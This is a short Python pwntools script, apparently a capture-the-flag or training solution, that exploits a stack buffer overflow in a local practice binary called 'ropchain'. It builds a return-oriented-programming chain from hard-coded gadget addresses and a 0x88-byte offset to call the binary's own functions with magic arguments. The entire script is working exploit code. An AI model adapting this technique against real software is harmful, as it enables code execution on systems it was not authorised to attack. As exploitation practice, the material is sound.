#!/usr/bin/env python3
from pwn import *

BIN = "./ropchain"
context.binary = BIN
elf = ELF(BIN)

# Functions and params:
call1_param1 = 0xdeadc0de
call1 = elf.symbols['call_1']

call2_param1 = 0xbeefc475
call2_param2 = 0x10101010
call2 = elf.symbols['call_2']

call_exit = elf.symbols['call_exit']

# Gadgets
pop_rdi = 0x401283
pop_rsi_r15 = 0x401281

# Static analysis
buf_offset = 0x88

payload = b"A" * buf_offset
payload += p64(pop_rdi) + p64(call1_param1) + p64(call1) +\
	p64(pop_rdi) + p64(call2_param1) + p64(pop_rsi_r15) +\
		p64(call2_param2) + p64(0) + p64(call2) +\
	p64(call_exit)

io = process(BIN)
io.sendline(payload)
print(io.recv().decode("utf-8"))
